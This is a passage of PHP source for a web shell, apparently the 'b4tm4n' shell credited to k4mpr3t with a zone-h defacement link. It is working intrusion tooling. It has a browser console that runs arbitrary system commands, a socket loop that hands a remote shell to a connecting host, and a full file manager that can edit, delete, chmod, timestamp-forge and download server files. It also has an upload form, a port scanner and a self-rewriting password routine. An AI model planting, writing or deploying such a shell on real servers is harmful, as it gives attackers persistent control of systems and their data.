				$rows = 10;
			}
			$rows = "20";
			printf( "
				<div id='console'>
					<textarea id='prompt' class='cmd' cols='122' rows='%s' readonly>%s</textarea>
					<form onsubmit='return false;'><br>
						$ %s: <br><br><input id='cmd' autocomplete='off' onfocus=\"var val=this.value;this.value='';this.value= val;\" onkeydown=\"if(event.keyCode == 13) return GetAjax('prompt','POST','?x=console&xa=consoles&cmd='+document.getElementById('cmd').value);\" class='cmd' name=cmd cols=122 rows=2 value=%s></input>
					</form>
				</div>", $rows, htmlspecialchars($ret), $dir, $command);

			if(array_key_exists("xa", $_REQUEST) && $_REQUEST['xa'] == "consoles")
			{	
				ob_clean();
				flush();
				$command = !empty($_REQUEST['cmd']) ? $_REQUEST['cmd'] : "whoami";
				$dir = array_key_exists("curdir", $_SESSION) ? $_SESSION['curdir'] : getcwd();
				chdir($dir);
				$charset = 'UTF-8';
				if(!Unix()){
					$charset = 'Windows-1251';
				}
				$ret = iconv($charset, 'UTF-8', Execute($command));
				echo htmlspecialchars($ret);	
				exit();
			}
		}
	}
	if($_REQUEST['x'] == "connect")
	{	
		if ($config['demo'] == true)
		{
			echo "Demo Version [Change Config]";
		}
		else
		{
			$host = gethostbyname($_SERVER['HTTP_HOST']);
			global $port;
			$bind = @fsockopen($host, $port, $errno, $errstr);

			if($errno != 0)
			{
				printf("<font color='red'><b>%s</b> : %s</font>", $errno, $errstr);
			}
			else
			{ 
				while(!feof($bind))
				{  
					fputs($bind, "[b4tm4n]: ");
					$command = fgets($bind, 1024);
					fputs($bind , Execute($command));
				} 
				fclose($bind); 
			}
		}
	}
	if($_REQUEST['x'] == "account")
	{
		if ($config['demo'] == true)
		{
			echo "Demo Version [Change Config]";
		}
		else
		{
			printf("<div id='account'><form class='new' method='post' action='?x=account&xa=change'>
						<label>Username</label> <input type='text' name='change-username' value='%s'/> <br>
						<label>Password</label> <input type='text' name='change-password' value=''/><br>
						<input type='submit' value='Change' onclick=\"return confirm('Sure ?');\"/>
					</form></div>", base64_decode($config['user']));

			if (array_key_exists("xa", $_REQUEST) && $_REQUEST['xa'] == "change")
			{
				$filename = $_SERVER["SCRIPT_FILENAME"];

				$pass_from = $config['pass'];
				$pass_to = sha1(md5($_POST['change-password']));
			    $content = file_get_contents($filename);
			    $chunk = explode($pass_from, $content);
			    $content = implode($pass_to, $chunk);
			    $change = file_put_contents($filename, $content);

			    $user_from = $config['user'];
				$user_to = base64_encode($_POST['change-username']);
				$content = file_get_contents($filename);
			    $chunk = explode($user_from, $content);
			    $content=implode($user_to, $chunk);
			    $change = file_put_contents($filename, $content);

				if ($change)
				{
			    	session_destroy();
					session_regenerate_id();
					header('location: '.$_SERVER['PHP_SELF']);	
				}
				else
				{
					printf("Error change account");
				}	    
			}
		}
	}
	if($_REQUEST['x'] == "action")
	{
		if ($config['demo'] == true)
		{
			echo "Demo Version [Change Config]";
		}
		else
		{
			$row = "";
			$files = isset($_POST['chk']) ? $_POST['chk'] : array();
			$_SESSION['tmp'] = $files;
			foreach ($files as $file)
			{
				$row .= "<tr><td>" .  urldecode($file) . "</td></tr>";
			}

			printf("<h4>List File</h4><table class='table'>%s</table>", $row);

			switch ($_REQUEST['action'])
			{
				case 'copy':
					printf("<h4>Copy to:</h4>
						<form class='new' method='post' action='?x=action&action=copy&_copy'>
							<input type='text' name='newloc' value='%s'/>
							<input type='submit' value='Submit' />
						</form>", $dir.DIRECTORY_SEPARATOR);
				break;
			}

			if(array_key_exists("_copy", $_REQUEST))
			{
				if ($config['demo'] == true)
				{
					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
				}
				else
				{
					print_r($_SESSION['tmp']);
					foreach ($files as $file)
					{
						echo $_REQUEST['newloc'].DIRECTORY_SEPARATOR.basename($file).'ss';
						copy($file, $_REQUEST['newloc'].DIRECTORY_SEPARATOR.basename($file).'ss');
						echo $_REQUEST['newloc'].DIRECTORY_SEPARATOR.basename($file).'ss';
					}
				}
			}
		}
	}
}

if(array_key_exists("r", $_REQUEST))
{
	$file = file_exists($_REQUEST["r"]) ? strval($_REQUEST["r"]) : exit('File Not Found');
	$back = $_SERVER['PHP_SELF'] . "?d=" . urlencode($dir);
	$status = array_key_exists("status", $_SESSION) ? $_SESSION['status'] : "";
	$source = "";

	$open = fopen($file, 'r');
	if ($open) 
	{
		while(!feof($open)) 
		{
			$source .= htmlentities(fread($open, (1024*4)));
		}
		fclose($open);
	}
	printf("<table class='table'>
				<tr><td>Name</td><td>%s</td></tr>
				<tr><td>Size</td><td>%s</td></tr>
				<tr><td>Permission</td><td>%s</td></tr>
				<tr><td>Create time</td><td>%s</td></tr>
				<tr><td>Last modified</td><td>%s</td></tr>
				<tr><td>Last accessed</td><td>%s</td></tr>
			</table>", 
			basename($file), 
			GetFileSize(filesize($file)), 
			GetFilePerm($file, true), 
			GetFileTime($file,"create"), 
			GetFileTime($file,"modify"), 
			GetFileTime($file,"access"));
	
	printf("<div class='menu'>
			<ul>
				<li><a href='%s'>Back</a></li>
				<li><a href='?a=e&r=%s'>Edit</a></li>
				<li><a href='?a=v&r=%s'>View</a></li>
				<li><a href='?a=d&r=%s'>Download</a></li>
				<li><a href='?a=x&r=%s'>Hexdump</a></li>
				<li><a href='?a=c&r=%s'>Chmod</a></li>
				<li><a href='?a=r&r=%s'>Rename</a></li>
				<li><a href='?a=t&r=%s'>Touch</a></li>
				<li><a href='?a=del&r=%s' onclick=\"return confirm('Delete It ?');\">Delete</a></li>
			</ul>
			</div>", 
			$back, 
			urlencode($file), 
			urlencode($file), 
			urlencode($file), 
			urlencode($file), 
			urlencode($file), 
			urlencode($file), 
			urlencode($file), 
			urlencode($file), 
			urlencode($file));

	if(array_key_exists("a", $_REQUEST))
	{
		if($_REQUEST['a'] == 'e')
		{
			printf("
			<form class='frmsource' method='POST'>
				<textarea id='sourcefocus' name='sourcecode' rows='25' cols='100'>%s</textarea><br />
				<input type='Submit' value='Save file' name='save'/><label>%s</label>
			</form>", 
			$source, $status);
		
			if(array_key_exists("status", $_SESSION))
			{
				unset($_SESSION['status']);
			}

			if(array_key_exists("save", $_POST))
			{
				if ($config['demo'] == true)
				{
					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
				}
				else
				{
					$new_source = $_POST['sourcecode'];
					if(function_exists("chmod")) chmod($file, 0755);
					$source_edit = fopen($file, 'wb+');
					$tulis = fputs($source_edit, $new_source);
					fclose($source_edit);
					if($tulis){
						$_SESSION['status'] = "File Saved ! ".GetFileTime($file,"modify")." | ".GetFileSize(filesize($file));
					}else{
						$_SESSION['status'] =  "Whoops ! Empty File | ".GetFileSize(filesize($file));
					}
					header("location: ".$_SERVER['PHP_SELF']."?a=e&r=".urlencode($file));
				}
			}
		}

		if($_REQUEST['a'] == 'r')
		{
			printf("
			<form class='new' method='POST'>
				<input type='text' name='name' value='%s'/><br />
				<input type='Submit' value='Rename' name='rename'/>
				<label>%s</label>
			</form>", basename($file), $status);

			if(array_key_exists("status", $_SESSION))
			{
				unset($_SESSION['status']);
			}

			if(array_key_exists("rename", $_POST))
			{
				if ($config['demo'] == true)
				{
					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
				}
				else
				{
					$name = $_POST['name'];
					$path = pathinfo($file);
					$newname = $path['dirname'].DIRECTORY_SEPARATOR.$name;
					if (!rename($file, $newname)) 
					{
					    $_SESSION['status'] =  'Whoops, something went wrong...';
					} 
					else 
					{
					    $_SESSION['status'] =  'Renamed file with success';
					}
					header("location: ".$_SERVER['PHP_SELF']."?a=r&r=".urlencode($newname));
				}
			}
		}

		if($_REQUEST['a'] == 'c')
		{
			printf("
			<form class='new' method='POST'>
				<input type='text' name='octal' value='%s'/><br />
				<input type='Submit' value='Chmod' name='chmod'/>
				<label>%s</label>
			</form>", substr(decoct(fileperms($file)),2), $status);

			if(array_key_exists("status", $_SESSION))
			{
				unset($_SESSION['status']);
			}

			if(array_key_exists("chmod", $_POST))
			{
				if ($config['demo'] == true)
				{
					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
				}
				else
				{
					$octal = $_POST['octal'];

					if (!chmod($file, $octal)) 
					{
					    $_SESSION['status'] =  'Whoops, something went wrong...';
					} 
					else 
					{
					    $_SESSION['status'] =  'Chmod file with success';
					}
				}
				header("location: ".$_SERVER['PHP_SELF']."?a=c&r=".urlencode($file));
			}
		}

		if($_REQUEST['a'] == 't')
		{
			printf("
			<form class='new' method='POST'>
				<input type='text' name='time' value='%s'/><br />
				<input type='Submit' value='Touch' name='touch'/>
				<label>%s</label>
			</form>", GetFileTime($file, "modify"), $status);

			if(array_key_exists("status", $_SESSION))
			{
				unset($_SESSION['status']);
			}

			if(array_key_exists("touch", $_POST))
			{
				if ($config['demo'] == true)
				{
					header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
				}
				else
				{
					$time = $_POST['time'];

					if (!touch($file, strtotime($time))) 
					{
					    $_SESSION['status'] =  'Whoops, something went wrong...';
					} 
					else 
					{
					    $_SESSION['status'] =  'Touched file with success';
					}
				}
				header("location: ".$_SERVER['PHP_SELF']."?a=t&r=".urlencode($file));
			}
		}

		if($_REQUEST['a'] == 'v')
		{
			if(is_readable($file))
			{
				$code = highlight_file($file, true);
				printf("<div class='highlight'>%s</div>", $code);
			}
		}
		
		if($_REQUEST['a'] == 'x')
		{
			$c = file_get_contents($file);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i)
			{
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) )
				{
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32)
				{
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			printf("
				<div id='hexdump'>
					<table class='hexdump'>
						<tr>
							<td><span style='font-weight: normal;''><pre>%s</pre></span></td>
							<td><pre>%s</pre></td>
							<td><pre>%s</pre></td>
						</tr>
					</table>
				</div>", $h[0], $h[1], htmlspecialchars($h[2]));
		}

		if($_REQUEST['a'] == 'd')
		{
			if (file_exists($file))
			{
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename='.basename($file));
				header('Content-Transfer-Encoding: binary');
				header('Expires: 0');
				header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
				header('Pragma: public');
				header('Content-Length: ' . filesize($file));
				ob_clean();
				flush();
				readfile($file);
			}
		}
		
		if($_REQUEST['a'] == 'del')
		{
			if ($config['demo'] == true)
			{
				header("location: ".$_SERVER['PHP_SELF']."?DEMO-VERSION-CHANGE-CONFIG");
			}
			else
			{
				if (file_exists($file))
				{
					unlink($file);
					header("location: ". $back);			
				}
			}		
		}
	}
}

if(array_key_exists("d", $_REQUEST) || $_SERVER['REQUEST_URI'] == $_SERVER["SCRIPT_NAME"])
{
	if(array_key_exists("file", $_POST) && $_POST['file'] == "New File")
	{
		if ($config['demo'] == true)
		{
			echo "Demo Version [Change Config]";
		}
		else
		{
			$file = $dir.DIRECTORY_SEPARATOR.$_POST['what'];
			$myfile = @fopen($file, "w");
			if ($myfile)
			{
				fclose($myfile);
				header("location: ".$_SERVER['PHP_SELF']."?a=e&r=".urlencode($file));
			}
			else
			{
				echo "<b class='off'>Can't create new file!</b>";
			}
		}
	}
	if(array_key_exists("folder", $_POST) && $_POST['folder'] == "New Folder")
	{	
		if ($config['demo'] == true)
		{
			echo "Demo Version [Change Config]";
		}
		else
		{
			chdir($dir);
			if(!@mkdir($_POST['what']))
			{
				echo "<b class='off'>Can't create new directory!</b>";
			}
			else
			{
				echo "Directory '" . $_POST['what'] . "' Created on " . GetFileTime($dir.DIRECTORY_SEPARATOR.$_POST['what'], 'create') ;
			}
		}
	}
	if(array_key_exists("upload", $_POST) && $_POST['upload'] == "Upload")
	{	
		if ($config['demo'] == true)
		{
			echo "Demo Version [Change Config]";
		}
		else
		{
			$upload = $dir.DIRECTORY_SEPARATOR.basename($_FILES["what"]["name"]);

		    if (move_uploaded_file($_FILES["what"]["tmp_name"], $upload)) 
		    {
		        echo "The file ". basename( $_FILES["what"]["name"]). " has been uploaded.";
		    } 
		    else 
		    {
		        echo "<b class='off'>Can't upload new file!</b>";
		    }
		}
	}
	
	$sep = (substr($dir,-1) == DIRECTORY_SEPARATOR) ?  "" : DIRECTORY_SEPARATOR;
	$_SESSION['curdir'] = $dir; // Save Chdir for Console
	
	if ($handle = opendir($dir))
	{
		$exp = "";
		while (false !== ($file = readdir($handle)))
		{
			$filedir = $dir.$sep.$file;
			$updir = substr($dir, 0, strrpos($dir, DIRECTORY_SEPARATOR));
			$type = GetFileType($filedir);
			$size = GetFileSize(filesize($filedir));
			$last = GetFileTime($filedir, "modify");
			$perm = GetFilePerm($filedir);
			$owner = GetOwnerGroup($filedir);
			
			if ($file == ".")
			{
				$exp .= "<tr sorttable_customkey='1'><td><center><input type='checkbox' name='chk[]' value='".urlencode($dir)."' /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a href='?d=" .urlencode($dir). "'>.</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td>R | T</td></tr>";
			}
			elseif ($file == "..")
			{
				$exp .= "<tr sorttable_customkey='1'><td><center><input type='checkbox' name='chk[]' value='".urlencode($updir)."' /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a href='?d=" .urlencode($updir). "'>" . $file . "</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td>R | T</td></tr>";
			}
			else
			{
				if ($type == "Dir")
				{
					$exp .= "<tr sorttable_customkey='2'><td><center><input type='checkbox' name='chk[]' value='".urlencode($filedir)."' /></center></td><td><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='/> <a class='flink' title='Explore Directory' href='?d=" .urlencode($filedir). "'>" . $file . "/</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td>R | T</td></tr>";
				}
				else
				{
					$exp .= "<tr sorttable_customkey='3'><td><center><input type='checkbox' name='chk[]' value='".urlencode($filedir)."' /></center></td><td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='> <a class='flink' title='Edit file' href='?a=v&r=" .urlencode($filedir). "'>" . $file . "</a></td><td><center>" . $type . "</center></td><td class='entrysize'>" . $size . "</td><td style='color:lime;'>".$perm."</td><td><center>".$owner."</center></td><td><center>" . $last . "</center></td><td><a href='?a=e&r=" .urlencode($filedir). "' title='Edit file'>E</a> | <a href='?a=del&r=" .urlencode($filedir). "' onclick=\"return confirm('Delete It ?');\" title='Delete'>X</a> | <a href='?a=d&r=".urlencode($filedir)."' title='Download file'>D</a></td></tr>";		
				}
			}
		}
		printf("<div id='action'>
					<table><tr>
					<td><form class='new' method=POST action='?d=%s'>
						<input name='what' type='text' /><input type='submit' name='file' value='New File'/>
						</form></td>
					<td><form class='new' method=POST action='?d=%s'>
						<input name='what' type='text' /><input type='submit' name='folder' value='New Folder'/>
					</form></td>
					<td><form class='new' method=POST action='?d=%s&x=upload' enctype='multipart/form-data'>
						<input name='what' type='file' /><input type='submit' name='upload' value='Upload'/>
					</form></td>
					</tr></table>
				</div>
				<div id='home'>
					<form class='new' name='files' method=POST action='?x=action'>
						<table class='table sortable'>
						<tr>
							<th class='sorttable_nosort'><input onclick='GetCheck()' type='checkbox'/></th>
							<th class='sorttable_numeric'>Name</th>
							<th>Type</th>
							<th>Size</th>
							<th>Perms</th>
							<th>Owner:Group</th>
							<th>Time</th>
							<th class='sorttable_nosort'>Act.</th>
						</tr>
						%s
						</table>
						<select name='action'>
							<option value='copy'>Copy</option>
							<option value='move'>Move</option>
							<option value='delete'>Delete</option>
							<option value='zip'>Compress (zip)</option>
							<option value='unzip'>Uncompress (zip)</option>
						</select>
						
						<input type='submit' value='Action' />
					</form>
				</div>", 
				urldecode($dir), 
				urlencode($dir), 
				urlencode($dir), 
				$exp);
		closedir($handle);
	}
}

if(array_key_exists("z", $_REQUEST))
{
	$z = $_REQUEST['z'];
	echo MenuTools(array(
		"custom-tools" => array(
			"title" => "Custom Tools",
			"desc"  => "Build your own tools",
	)));
	echo "<div id='tools'>";
	
	if(empty($z))
	{
		echo("<div id='thanks'>Nothing Is Secure ...</div>");
	}
	
	if($z == "port-scanner")
	{
		echo "<center><h3>". $default[$z]['desc'] . "</h3></center>";

		printf( "<div id='port-scan'>
					<form onsubmit='return false;' class='new'>
						<label>Host Port</label><input type='text' id='ip-port' value='%s'/><br>
						<label>Start Port</label><input type='text' id='start-port' value='1'/><br>
						<label>End Port</label><input type='text' id='end-port' value='255'/><br>
						<label>Methode</label><select id='scan-port'><option value='1'>socket_connect</option><option value='2'>fsockopen</option></select><br>
						<input type='submit' id='end-port' onclick=\"return GetAjax('port-result','POST','?z=port-scanner&x=scan-port&ip='+document.getElementById('ip-port').value+'&sp='+document.getElementById('start-port').value+'&ep='+document.getElementById('end-port').value+'&mtd='+document.getElementById('scan-port').value);\"/><br>
					</form>
				</div>
				<div id='port-result' class='result'></div>", gethostbyname($_SERVER['HTTP_HOST']));

		if (array_key_exists("x", $_REQUEST) && $_REQUEST['x'] == "scan-port")
		{
			error_reporting(~E_ALL);
			ob_clean();
			flush();
			$host = $_REQUEST['ip'];
			$from = $_REQUEST['sp'];
			$to   = $_REQUEST['ep']; 
			$mtd  = $_REQUEST['mtd']; 

			switch ($mtd)
			{
				case '1':
					if (function_exists('socket_create'))
					{
						$socket = socket_create(AF_INET , SOCK_STREAM , SOL_TCP);  
						for($port = $from; $port <= $to ; $port++)
						{
						    $connection = socket_connect($socket , $host ,  $port);
						    if ($connection)
						    {
						      echo "<br>port $port open";
						      socket_close($socket);
						      $socket = socket_create(AF_INET , SOCK_STREAM , SOL_TCP);  
						    }    
						}
					}
					else
					{
						echo "Error socket_connect<br>";
					}
					
				break;
				case '2':
					for($port = $from; $port <= $to ; $port++)
					{
					  $fp = fsockopen($host , $port);
					  if ($fp)
					  {
					    echo "<br>port $port open";
					    fclose($fp);
					  }
					}
				break;
			}
			echo "<br>Scan Finish.";
			exit();
		}
	}
	
	/* YOUR TOOLS START HERE */
	
	if($z == "custom-tools")
	{
		echo "<center><h3>". $default[$z]['desc'] . "</h3></center>";
	}
	
	/* YOUR TOOLS END HERE */

	echo "</div>";
}

printf("</div>
	<div id='footer'>
		<div id='copyrights'><a href='//www.zone-h.org/archive/notifier=k4mpr3t'>k4mpr3t</a> &copy; %s</div>
		<div id='pageload'>Page Loaded in %s Seconds</div>
	</div>
</div>", date('Y'), round((microtime() - $start), 2));
} ?></body>
</html>